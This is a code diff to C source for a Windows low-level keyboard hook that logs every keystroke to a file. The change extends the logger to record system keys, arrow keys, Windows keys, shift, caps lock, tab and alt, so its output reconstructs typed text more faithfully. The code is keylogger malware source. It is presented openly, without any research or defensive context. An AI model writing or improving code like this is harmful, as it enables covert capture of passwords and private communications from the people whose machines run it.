@@ -44,13 +44,65 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
     DWORD   kCode = 0;
     // (void)GetClipboardData(NULL);
-    if (wParam == WM_KEYDOWN)
+    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
     {
         char inputLog[64];
         switch(pkey->vkCode)
         {
+            case VK_UP:
+                sprintf_s(inputLog, sizeof(inputLog), "[UP_ARROW]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_DOWN:
+                sprintf_s(inputLog, sizeof(inputLog), "[DOWN_ARROW]");
+                WriteToFile(inputLog);
+                break ;   
+            case VK_RIGHT:
+                sprintf_s(inputLog, sizeof(inputLog), "[RIGHT_ARROW]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_LEFT:
+                sprintf_s(inputLog, sizeof(inputLog), "[LEFT_ARROW]");
+                WriteToFile(inputLog);
+                break ;     
+            case VK_DELETE:
+                sprintf_s(inputLog, sizeof(inputLog), "[DELETE]");
+                WriteToFile(inputLog);
+                break ;       
+            case VK_LWIN:
+                sprintf_s(inputLog, sizeof(inputLog), "[LWIN]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_RWIN:
+                sprintf_s(inputLog, sizeof(inputLog), "[RWIN]");
+                WriteToFile(inputLog);
+                break ; 
+            case VK_RSHIFT:
+                sprintf_s(inputLog, sizeof(inputLog), "[RSHIFT]");
+                WriteToFile(inputLog);
+                break ;       
+            case VK_LSHIFT:
+                sprintf_s(inputLog, sizeof(inputLog), "[LSHIFT]");
+                WriteToFile(inputLog);
+                break ;  
+            case VK_CAPITAL:
+                sprintf_s(inputLog, sizeof(inputLog), "[CAPSLOCK]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_TAB:
+                sprintf_s(inputLog, sizeof(inputLog), "[TAB]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_RMENU:
+                sprintf_s(inputLog, sizeof(inputLog), "[RLALT]");
+                WriteToFile(inputLog);
+                break ;
+            case VK_LMENU:
+                sprintf_s(inputLog, sizeof(inputLog), "[LALT]");
+                WriteToFile(inputLog);
+                break ;
             case VK_SPACE:
-                sprintf_s(inputLog, sizeof(inputLog), "[SPACE]");
+                sprintf_s(inputLog, sizeof(inputLog), " ");
 				WriteToFile(inputLog);
                 break ;
             case VK_RETURN:
